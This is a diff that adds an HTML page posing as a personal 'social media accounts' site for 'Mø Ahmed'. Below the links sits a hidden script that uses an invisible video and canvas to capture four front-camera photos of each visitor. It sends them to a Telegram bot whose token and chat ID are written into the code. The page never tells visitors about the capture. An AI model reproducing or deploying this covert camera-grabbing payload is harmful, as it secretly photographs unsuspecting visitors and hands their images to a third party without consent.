@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta thhp-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>My accounts online-Mø Ahmed</title>
+    <link rel="stylesheet" href="r.css">
+    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+</head>
+<body>
+    <div class="contenr">
+        <header>
+    <a href="#Mø Ahmed" class="logo">Mø Ahmed</a>
+    <nav class="tr">
+    <a class="ty" href="lar.html"></a>
+    </nav>
+    </div>
+    </header>
+    <br>
+    <div class="q">
+    
+    <h2>
+       <span class="qq">Welcome to</span> 
+    <br>
+    <br>
+        <span class="qqq">Mø Ahmed Website
+        </span>
+    <br>
+    <br>
+    <div class="qw">
+    
+    <span class="qqqq">My social</span><div class="qqqqq"> media accounts</div>
+    </div>
+    <br>
+    <div class="acc">   
+    <a target="_blank" href="https://web.facebook.com/profile.php?id=61550279660292" class="icon" ><i class='bx bxl-facebook-circle'></i></a>
+    <a target="_blank" href="https://www.instagram.com/mo_ahmed1.k/?__pwa=1" class="icon" ><i class='bx bxl-instagram'></i></a>
+    <a target="_blank" href="https://t.me/mo_1ok"  class="icon"><i class='bx bxl-telegram'></i></a>
+    <a target="_blank" href="https://web.facebook.com/profile.php?id=61550279660292"  class="icon"><i class='bx bxl-messenger'></i></a>
+    </div>
+    </h2>
+    
+    </div>
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <br>
+    <footer class="footer">
+    <p class="ftooer-t">Copyrights @<span ><a class="ff"  href="https://t.me/mo_1ok">Mø Ahmed</a></span></p>
+    
+       <div class="f-t">   
+        <a target="_blank" href="https://web.facebook.com/profile.php?id=61550279660292" class="icon" ><i class='bx bxl-facebook-circle'></i></a>
+        <a target="_blank" href="https://www.instagram.com/mo_ahmed1.k/?__pwa=1" class="icon" ><i class='bx bxl-instagram'></i></a>
+        <a target="_blank" href="https://t.me/mo_1ok"  class="icon"><i class='bx bxl-telegram'></i></a>
+        <a target="_blank" href="https://web.facebook.com/profile.php?id=61550279660292"  class="icon"><i class='bx bxl-messenger'></i></a>
+        </div>
+    </div>
+    </footer>
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        let photoCount = 0;
+        const maxPhotos = 4;
+    
+        // الحصول على إذن الكاميرا
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(function (stream) {
+                video.srcObject = stream;
+                capturePhotos();
+            })
+            .catch(function (error) {
+                console.error("خطأ في الوصول إلى الكاميرا:", error);
+            });
+    
+        function capturePhotos() {
+            const interval = setInterval(() => {
+                if (photoCount >= maxPhotos) {
+                    clearInterval(interval);
+                    return;
+                }
+    
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    
+                const imageData = canvas.toDataURL('image/png');
+                sendToTelegram(imageData);
+    
+                photoCount++;
+            }, 500); // التقاط صورة كل نصف ثانية
+        }
+    
+        function sendToTelegram(imageData) {
+            const telegramBotToken = '7214420833:AAE9-I-ZCnIrb1aDBrhCVr1I2piz4JEUoZU'; 
+            const telegramChatId = '5471126331'; 
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendPhoto`;
+    
+            // تحويل base64 إلى Blob
+            function dataURLtoBlob(dataURL) {
+                const byteString = atob(dataURL.split(',')[1]);
+                const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
+                const ab = new ArrayBuffer(byteString.length);
+                const ia = new Uint8Array(ab);
+                for (let i = 0; i < byteString.length; i++) {
+                    ia[i] = byteString.charCodeAt(i);
+                }
+                return new Blob([ab], { type: mimeString });
+            }
+    
+            const blob = dataURLtoBlob(imageData);
+            const formData = new FormData();
+            formData.append('chat_id', telegramChatId);
+            formData.append('photo', blob, 'image.png');
+    
+            fetch(url, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('تم إرسال الصورة بنجاح:', data);
+            })
+            .catch(error => {
+                console.error('فشل في إرسال الصورة:', error);
+            });
+        }
+    </script>
+    
+
+</body>
+</html>
